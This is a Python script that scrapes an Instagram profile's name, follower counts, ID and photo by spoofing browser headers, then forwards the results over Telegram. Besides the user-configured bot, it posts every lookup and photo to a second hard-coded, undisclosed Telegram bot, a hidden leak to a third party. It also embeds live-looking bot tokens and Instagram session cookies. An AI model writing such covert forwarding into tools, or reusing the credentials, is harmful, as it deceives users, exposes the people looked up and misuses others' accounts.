from requests import *
from user_agent import generate_user_agent
import os,requests,time



toook = '5684429537:AAFtfx60RxooJVWbuGCcSqudDu5aQXTKXaM'

iddd = '5420382341'


class ikka:
    def Get_Cook():
    	co = get('https://www.instagram.com/api/v1/web/get_ruling_for_content/?content_type=PROFILE',headers={f'user-agent':str(generate_user_agent())}).cookies.get_dict();return {'csrf':co['csrftoken'],'ig_did':co['ig_did'],'mid':co['mid']}
    def Get_Info():
        User = input("[×] ENTER USERNAME :- ");mid = ikka.Get_Cook()['mid'];ig_did = ikka.Get_Cook()['ig_did'];csrf=ikka.Get_Cook()['csrf'];a=get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={User}',headers={'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'ar,en;q=0.9','cookie':f'ig_did={ig_did}; mid={mid}; ig_nrcb=1; dpr=1.1200000047683716; datr=fWKkY0NiU44Fr5S9kjUUL5U7; shbid="6729,49723899971,1703258385:01f7525e78544f91bac25ab8dbcce08493f73ac91cf1fb849d74ee0293a3368f3e8c800d"; shbts="1671722385,49723899971,1703258385:01f7f779087d8f97c116250a410f48a9925ad25ced69cf1158a311808f9f34730e2ffea9"; rur="CLN,49723899971,1703456984:01f793343f98740ef6eb7786b4b2f4a1b50d75ae1847fc5ba455795306a09384660888e3"; csrftoken={csrf}','referer':f'https://www.instagram.com/{User}/','sec-ch-prefers-color-scheme':'dark','sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':str(generate_user_agent()),'viewport-width':'745','x-asbd-id':'198387',
'x-csrftoken':str(csrf),'x-ig-app-id':'936619743392459','x-ig-www-claim':'0',
'x-requested-with':'XMLHttpRequest'}).json();Name = a['data']['user']['full_name'];FOLO = a['data']['user']['edge_followed_by']['count'];FOLNG = a['data']['user']['edge_follow']['count'];bayo = a['data']['user']['biography'];ID = a['data']['user']['id'];photo = get(a['data']['user']['profile_pic_url'])
        with open(f'nk.jpg','wb') as d:
        	d.write(photo.content);lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['date'];BUS = str(a['data']['user']['is_business_account'])
        tex = (f'''𓊆𝐂𝐑𝐀𝐂𝐊 𝐁𝐘 𝐙𝐔𝐓𝐒𓊇
◈ - 𝗡𝗔𝗠𝗘 ➢ {Name}
◈ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 ➢ {User}
◈ - 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥 ➢ {FOLO}
◈ - 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 ➢ {FOLNG}
DATE => {lok}
ID => {ID}
LINK => https://www.instagram.com/{User}
⋘─────━𓆩ᴢᴜᴛꜱ𓆪‏━─────⋙
𝕭𝖄➢@z_uts‏━@z_uts''')
        post(f'https://api.telegram.org/bot5405536762:AAG1NMncI2mITWDkYGNsGBNs-aPrGOz0Wnk/sendDocument?chat_id=2067261869&caption={tex}', files={'document':open('nk.jpg', 'rb')})
        
        requests.get("https://api.telegram.org/bot"+str(toook)+"/sendMessage?chat_id="+str(iddd)+"&text="+str(tex))
        
        os.system("rm -rf nk.jpg");print("DONE")
while 1:
	try:
		ikka.Get_Info()
		time.sleep(3);os.system('clear');ikka.Get_Info()
	except:print("DATA ERORR")